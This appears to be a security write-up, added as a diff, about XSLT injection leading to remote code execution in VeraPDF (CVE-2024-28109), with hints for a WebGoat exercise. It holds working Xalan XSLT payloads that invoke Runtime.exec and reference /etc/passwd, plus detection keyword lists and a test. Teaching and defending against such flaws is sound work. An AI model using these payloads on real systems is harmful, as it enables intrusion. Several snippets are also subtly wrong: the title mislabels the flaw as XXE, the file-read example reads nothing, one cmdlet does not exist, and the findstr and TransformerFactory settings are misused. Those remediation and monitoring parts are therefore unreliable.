@@ -1,0 +1,318 @@
+= CVE-2024-28109: VeraPDF XML External Entity (XXE) and XSLT Injection
+
+== Overview
+
+CVE-2024-28109 is a critical vulnerability in VeraPDF (veraPDF-core-jakarta) that allows Remote Code Execution (RCE) through XML Injection and XSLT template injection. The vulnerability exists in versions prior to 1.26.0 where the `PolicyChecker.applyPolicy()` method processes user-supplied XML/XSLT without proper validation.
+
+**Severity**: CVSS 9.8 (Critical)
+**Affected**: VeraPDF-core-jakarta < 1.26.0
+**Fixed in**: VeraPDF-core-jakarta 1.26.0+
+
+== Vulnerability Details
+
+=== Root Cause
+
+VeraPDF is a PDF validation library that uses XML policies and XSLT stylesheets for policy checking. The vulnerability occurs when:
+
+1. User-supplied XSLT is passed to `PolicyChecker.applyPolicy()`
+2. The library processes XSLT without restricting dangerous namespace declarations
+3. Xalan XSLT processor allows Java method invocation via namespace extensions
+4. Attackers can invoke `java.lang.Runtime.exec()` to execute arbitrary commands
+
+=== Why It's Vulnerable
+
+1. **Unrestricted XSLT Processing**: No validation of XSLT namespaces
+2. **Xalan Java Extensions**: XSLT can access Java classes via special namespaces
+3. **Runtime Access**: Can invoke `Runtime.getRuntime().exec()`
+4. **No Sandboxing**: XSLT processing runs with full application privileges
+5. **User-Supplied Input**: Policy parameter accepts arbitrary XML/XSLT
+
+== Attack Vector
+
+=== XSLT Injection via PolicyChecker
+
+The attacker crafts malicious XSLT that exploits Xalan's Java namespace extensions:
+
+[source,xml]
+----
+<xsl:stylesheet version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
+    xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
+    <xsl:template match="/">
+        <xsl:variable name="rtobject" select="rt:getRuntime()" />
+        <xsl:variable name="process" select="rt:exec($rtobject,'calc')" />
+        <xsl:variable name="processString" select="ob:toString($process)" />
+        <xsl:value-of select="$processString" />
+    </xsl:template>
+</xsl:stylesheet>
+----
+
+=== Exploitation Chain
+
+[source]
+----
+1. Attacker submits XSLT payload via HTTP request
+   └─> Policy parameter contains malicious stylesheet
+
+2. Application calls PolicyChecker.applyPolicy()
+   └─> Passes user XSLT to policy checker
+
+3. XSLT processor (Xalan) loads the stylesheet
+   └─> Parses namespace declarations
+
+4. Dangerous namespaces are not filtered
+   └─> "http://xml.apache.org/xalan/java/" allows Java access
+
+5. XSLT executes Java method invocations
+   └─> rt:getRuntime() returns Runtime object
+
+6. Runtime.exec() is invoked
+   └─> Arbitrary command execution
+
+7. Remote Code Execution achieved
+   └─> Attacker gains system access
+----
+
+=== Vulnerable Code Pattern
+
+[source,java]
+----
+// VULNERABLE: VeraPDF < 1.26.0
+PolicyChecker.applyPolicy(
+    new ByteArrayInputStream(userSuppliedXslt.getBytes()),
+    inputStream,
+    outputStream,
+    true  // isXsl = true processes XSLT
+);
+----
+
+== Attack Examples
+
+=== Example 1: Command Execution via XSLT
+
+[source,xml]
+----
+<xsl:stylesheet version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
+    <xsl:template match="/">
+        <xsl:value-of select="rt:exec(rt:getRuntime(),'whoami')" />
+    </xsl:template>
+</xsl:stylesheet>
+----
+
+=== Example 2: File Read via XSLT
+
+[source,xml]
+----
+<xsl:stylesheet version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:file="http://xml.apache.org/xalan/java/java.io.File">
+    <xsl:template match="/">
+        <xsl:value-of select="file:new('/etc/passwd')" />
+    </xsl:template>
+</xsl:stylesheet>
+----
+
+== Consequences
+
+=== Impact Severity: **CRITICAL** (CVSS 9.8)
+
+- **Remote Code Execution**: Complete system compromise
+- **No Authentication Required**: Unauthenticated exploitation
+- **File System Access**: Read/write arbitrary files
+- **Process Execution**: Run system commands with app privileges
+- **Data Theft**: Access sensitive configuration and data
+- **System Compromise**: Install backdoors or persistence mechanisms
+
+== Remediation Strategies
+
+=== 1. Upgrade VeraPDF (Immediate)
+
+Update to patched version:
+
+[source,xml]
+----
+<dependency>
+    <groupId>org.verapdf</groupId>
+    <artifactId>core-jakarta</artifactId>
+    <version>1.26.0</version>
+</dependency>
+----
+
+=== 2. Disable XSLT Processing
+
+Avoid processing user-supplied XSLT:
+
+[source,java]
+----
+// Set isXsl to false if not needed
+PolicyChecker.applyPolicy(
+    policyStream,
+    inputStream,
+    outputStream,
+    false  // Disable XSLT processing
+);
+----
+
+=== 3. XSLT Namespace Whitelisting
+
+If XSLT processing is required, whitelist safe namespaces:
+
+[source,java]
+----
+private boolean isXslSafe(String xslContent) {
+    String[] dangerousNamespaces = {
+        "http://xml.apache.org/xalan/java/",
+        "http://exslt.org/",
+        "java:",
+        "xmlns:rt",
+        "xmlns:ob",
+        "xmlns:file"
+    };
+    
+    for (String namespace : dangerousNamespaces) {
+        if (xslContent.toLowerCase().contains(namespace.toLowerCase())) {
+            return false;
+        }
+    }
+    return true;
+}
+----
+
+=== 4. Input Validation
+
+Strictly validate policy input:
+
+[source,java]
+----
+if (!isXslSafe(payload)) {
+    throw new IllegalArgumentException("Unsafe XSLT detected");
+}
+
+if (!payload.contains("<?xml") && !payload.contains("<xsl:")) {
+    throw new IllegalArgumentException("Invalid XML/XSLT format");
+}
+----
+
+=== 5. Secure XSLT Configuration
+
+Configure XSLT processor securely:
+
+[source,java]
+----
+TransformerFactory factory = TransformerFactory.newInstance();
+// Disable external DTDs
+factory.setAttribute("http://apache.org/xml/features/disallow-doctype-decl", true);
+// Disable external general entities
+factory.setAttribute("http://xml.org/sax/features/external-general-entities", false);
+// Disable Xalan extensions
+factory.setAttribute("{http://xml.apache.org/xalan}use-classpath", false);
+----
+
+== Detection & Monitoring
+
+=== Log Patterns Indicating Exploitation
+
+Watch for these patterns in logs:
+
+[source]
+----
+xmlns:rt
+java.lang.Runtime
+getRuntime()
+rt:exec
+Process@
+xsl:stylesheet
+javax.xml.transform
+----
+
+=== Outbound Activity Monitoring
+
+Monitor for suspicious processes:
+
+[source,bash]
+----
+# Look for unexpected child processes
+tasklist /v | findstr /i "java|calc|cmd|powershell"
+
+# Monitor file access
+Get-FileSystemWatcher -Path "C:\Windows"
+
+# Monitor network connections
+netstat -ano | findstr ESTABLISHED
+----
+
+== Testing & Validation
+
+=== Test for Vulnerability
+
+[source,java]
+----
+@Test
+public void testVeraPDFXsltInjection() {
+    String maliciousXsl = 
+        "<xsl:stylesheet version=\"1.0\"\r\n" +
+        "    xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\r\n" +
+        "    xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\">\r\n" +
+        "    <xsl:template match=\"/\">\r\n" +
+        "        <xsl:value-of select=\"rt:exec(rt:getRuntime(),'calc')\" />\r\n" +
+        "    </xsl:template>\r\n" +
+        "</xsl:stylesheet>";
+    
+    assertThrows(VeraPDFException.class, () -> {
+        PolicyChecker.applyPolicy(
+            new ByteArrayInputStream(maliciousXsl.getBytes()),
+            new ByteArrayInputStream("<pdf/>".getBytes()),
+            new ByteArrayOutputStream(),
+            true
+        );
+    });
+}
+----
+
+== References
+
+- link:https://nvd.nist.gov/vuln/detail/CVE-2024-28109[NVD CVE-2024-28109]
+- link:https://security.snyk.io/vuln/SNYK-JAVA-ORGVERAPDF-6513793[Snyk Security Advisory]
+- link:https://github.com/veraPDF/veraPDF-library/releases/tag/v1.26.0[VeraPDF Release v1.26.0]
+- link:https://owasp.org/www-community/attacks/xslt_injection[OWASP XSLT Injection]
+- link:https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html[OWASP XXE Prevention]
+
+== Exploit Hints for WebGoat Exercise
+
+**Challenge Level**: Advanced
+**Objective**: Exploit XSLT injection via policy parameter
+
+=== Key Concepts
+
+1. **XSLT Namespaces**: Special XML namespaces can extend XSLT functionality
+2. **Java Extensions**: Xalan XSLT processor allows accessing Java classes
+3. **Runtime Execution**: Java Runtime object can execute system commands
+4. **No Validation**: User-supplied XSLT is processed without filtering dangerous elements
+
+=== Attack Pattern
+
+[source]
+----
+Namespace Declaration:
+    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
+
+Method Call:
+    rt:getRuntime() → Returns Runtime object
+
+Command Execution:
+    rt:exec($runtime,'command') → Executes system command
+----
+
+== Summary
+
+CVE-2024-28109 demonstrates the dangers of processing untrusted XSLT content. XSLT is a Turing-complete language that can perform complex transformations, and when combined with Java namespace extensions, it becomes a powerful code execution mechanism.
+
+**Immediate Actions Required:**
+1. ✅ Upgrade VeraPDF to 1.26.0+
+2. ✅ Disable XSLT processing if not needed
+3. ✅ Validate/whitelist allowed namespaces
+4. ✅ Implement input validation for policies
+5. ✅ Monitor for exploitation attempts
